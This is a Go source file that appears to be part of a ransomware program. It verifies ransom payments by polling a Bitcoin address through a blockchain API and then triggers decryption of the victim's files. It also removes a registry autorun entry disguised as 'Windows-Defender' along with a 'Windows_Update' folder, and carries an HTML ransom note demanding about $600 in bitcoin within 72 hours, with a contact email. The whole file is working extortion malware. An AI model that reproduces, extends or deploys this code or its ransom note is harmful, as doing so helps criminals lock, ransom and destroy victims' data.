package main

import "fmt"
import "net/http"
import "io/ioutil"
import "time"
import "encoding/json"
import "strconv"
import "os"
import "math/rand"


var RandID = strconv.FormatInt(int64(rand.Intn(99)), 10)
const PRICE_BASE float64 = 1.00
var Price_id float64 = StringToFloat("0.00"+ RandID)
var PRICE float64 = PRICE_BASE /*600$*/ + Price_id

func GetTransactions() Transactions{
	resp, _ := http.Get("http://btc.blockr.io/api/v1/address/txs/" + BTC_ADDRESS) //Returns last 200 transactions, check for one wit the same sandom price asked and if confirmations >6 decrypt
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)

	var trans Transactions
	err := json.Unmarshal(respBody, &trans)
	if err != nil {fmt.Println("Cannot verify transaction");}
	return trans
}

func GetTotalAddress() Total {
	resp, _ := http.Get("http://btc.blockr.io/api/v1/address/info/" + BTC_ADDRESS) //Get total when asked for payment and when ready to decrypt if total in not greatter than before ask again
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)
	var tot Total
	err := json.Unmarshal(respBody, &tot)
	if err != nil {fmt.Println("Cannot verify total");}
	return tot
}

func TxToArr() []float64 {
	tx := GetTransactions();
	var arr []float64
	i := 0
	txCount, _ := json.Marshal(tx.Data.NbTxs)
	txCountInt, _ := strconv.Atoi(string(txCount))
	for i < txCountInt && i < 15 {
		fmt.Println(i)
		a, err := json.Marshal(tx.Data.Txs[i].Amount)
		fmt.Println(err.Error())
		b, _ := strconv.ParseFloat(string(a), 64)
		arr = append(arr, b)
		i++;
	}
	return arr
}

func CheckPrices(amounts []float64) bool {
	for _,amount := range amounts {
  		if amount == PRICE {
  			return true
  		}
	}
	return false
}

func FloatToString(n float64)  string {
	return strconv.FormatFloat(n, byte('f'), 6, 64)
}
func StringToFloat(str string) float64 {
	fl, _ := strconv.ParseFloat(str, 64)
	return fl
	
}

func ListenForPayment()  {
	old_total, _ := json.Marshal(GetTotalAddress().Data.Balance);
	old_totalF := StringToFloat(string(old_total))
	for {
		if CheckPrices(TxToArr()) {
			new_total, _ := json.Marshal(GetTotalAddress().Data.Balance);
			new_totalF := StringToFloat(string(new_total))
			if new_totalF > old_totalF {
				Run("msg * Recived, decrypting files... This can take a while")
				End()
			} else {
				Run("msg * Error, cannot veryfy payment, contact helpmedecrypt@protonmail.com")
			}
			break;
		}
		WaitLong()
	}
}

func End() {
	//Decrypt
	EncryptExternalDrives(false);
	EncryptDocumets("C:\\",false)
	
	//REmove key
	Run("REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows-Defender /t REG_SZ /F /D %APPDATA%\\Windows_Update\\"+ TARGET_FILE_NAME)
	
	//Delete home
	os.RemoveAll(os.Getenv("APPDATA")+"\\Windows_Update")

	//Delete self
	Run("Bye, take care and backup your files :)")
	os.Exit(0)
}


type Transactions struct {
	Status string `json:"status"`
	Data struct {
		Address string `json:"address"`
		LimitTxs int `json:"limit_txs"`
		NbTxs int `json:"nb_txs"`
		NbTxsDisplayed int `json:"nb_txs_displayed"`
		Txs []struct {
			Tx string `json:"tx"`
			TimeUtc time.Time `json:"time_utc"`
			Confirmations int `json:"confirmations"`
			Amount float64 `json:"amount"`
			AmountMultisig int `json:"amount_multisig"`
		} `json:"txs"`
	} `json:"data"`
	Code int `json:"code"`
	Message string `json:"message"`
}

type Total struct {
	Status string `json:"status"`
	Data struct {
		Address string `json:"address"`
		IsUnknown bool `json:"is_unknown"`
		Balance float64 `json:"balance"`
		BalanceMultisig int `json:"balance_multisig"`
		Totalreceived float64 `json:"totalreceived"`
		NbTxs int `json:"nb_txs"`
		FirstTx struct {
			TimeUtc time.Time `json:"time_utc"`
			Tx string `json:"tx"`
			BlockNb string `json:"block_nb"`
			Value int `json:"value"`
			Confirmations int `json:"confirmations"`
		} `json:"first_tx"`
		LastTx struct {
			TimeUtc time.Time `json:"time_utc"`
			Tx string `json:"tx"`
			BlockNb string `json:"block_nb"`
			Value float64 `json:"value"`
			Confirmations int `json:"confirmations"`
		} `json:"last_tx"`
		IsValid bool `json:"is_valid"`
	} `json:"data"`
	Code int `json:"code"`
	Message string `json:"message"`
}




var TEXT = `<p><center><h1>ALL YOUR FILES HAS BEEN ENCRYPTED</br></h1></center></p>

<p>All your files have been encrypted using AES 256, there
is no way to detrypt them by yourself.</p>

<p>If you want to decrypt them you have to pay aproximatly <b>600$</b> in Bitcoins<br>
to the following address:</p>

<p>Amount: <b>` + FloatToString(PRICE) + ` BTCs</b><br>
To the address: <b>` + BTC_ADDRESS + `</b></p>

<p>Do not worry if you don't know what bitcoins are, they are an online currency<br>
that is not regulated by any goverment, the price changes daily but now is near the 600$ usd dollars<br>
To get some bitcoins you can go to some of this web pages:</p>

<p> - <a href="http://www.coinbase.com">Coinbase</a><br>
 In this page you can store your bitcoins and also buy them using your credit card,<br>
 It is a safe page, you can chech it online if you aren't sure</p>

<p>- <a href="http://www.localbitcoins.com">localbitcoins.com</a> <br>
 This a web where people contact each others to exchange Bitcoins for money in paypal,<br>
 in cash if you find someone nearby and many other ways</p>

<p>I strongly recommend coinbase.com as you can be done un 15 minutes and your files will start decrypting<br>
I recommend you look for info online if you don't want to use coinbase.com</p>

<p>IT IS EXTREMELY IMPORTANT THAT YOU SEND THE EXACT AMMOUNT AND THAT THIS PROGRAM IS RUNNING <br>
WHILE YOU MAKE THE PAYMENT TO BE ABLE TO CONFIRM THE TRANSACTION.</p>

<p>If you can't figure out something send me an email to helpmedecrypt@protonmail.com<br>
You have 72 hours form now on to send the payment or you will lose all the data so don't <br>
wait to send an email if you don't know something.</p>

<p>I hope to hear from you soon.<br>
</p>`